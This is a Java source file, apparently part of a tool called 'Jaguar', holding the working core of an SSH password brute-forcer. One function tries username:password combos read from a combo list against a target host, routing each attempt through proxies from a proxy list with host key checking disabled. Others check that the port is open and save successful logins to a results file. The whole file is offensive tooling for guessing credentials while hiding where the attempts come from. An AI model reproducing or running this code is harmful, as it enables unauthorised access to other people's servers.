package me.aaronakhtar.jaguar;

import com.jcraft.jsch.JSch;
import com.jcraft.jsch.ProxyHTTP;
import com.jcraft.jsch.Session;
import me.aaronakhtar.jaguar.objects.JaguarCombo;
import me.aaronakhtar.jaguar.objects.JaguarProxy;

import java.io.*;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.Date;

public class JaguarUtilFunctions {

    public static boolean attemptBrute(String host, JaguarCombo combo, JaguarProxy jaguarProxy) throws Exception {
        JSch jsch = new JSch();
        Session session = jsch.getSession(combo.getUsername(), host, Jaguar.target_port);
        try (AutoCloseable autoCloseable = () -> session.disconnect()) {
            session.setPassword(combo.getPassword());
            session.setProxy(new ProxyHTTP(jaguarProxy.getHost(), jaguarProxy.getPort()));
            java.util.Properties config = new java.util.Properties();
            config.put("StrictHostKeyChecking", "no");
            session.setConfig(config);
            session.setTimeout(Jaguar.uni_timeout);
            session.connect();
            return true;
        }
    }

    public static void save(String m) throws Exception {
        try(PrintWriter writer = new PrintWriter(new FileWriter(Jaguar.results_file, true), true)){
            writer.println(m);
        }
    }

    //TODO: use proxy for checking or alternate method
    public static boolean checkIfPortIsOpen(String host){
        try(Socket socket = new Socket()){
            socket.connect(new InetSocketAddress(host, Jaguar.target_port), Jaguar.uni_timeout);
            return true;
        }catch (Exception e){
           // e.printStackTrace();
            return false;
        }
    }


    protected static void getProxyList(File file) throws Exception {
        try(BufferedReader reader = new BufferedReader(new FileReader(file))){
            String i;
            while((i = reader.readLine()) != null){
                final String[] ii = i.split(":");
                Jaguar.proxy_list.add(new JaguarProxy(ii[0], Integer.parseInt(ii[1])));
            }
        }
    }

    protected static void getComboList(File file) throws Exception {
        try(BufferedReader reader = new BufferedReader(new FileReader(file))){
            String i;
            while((i = reader.readLine()) != null){
                final String[] ii = i.split(":");
                Jaguar.combo_list.add(new JaguarCombo(ii[0], ii[1]));
            }
        }
    }


}
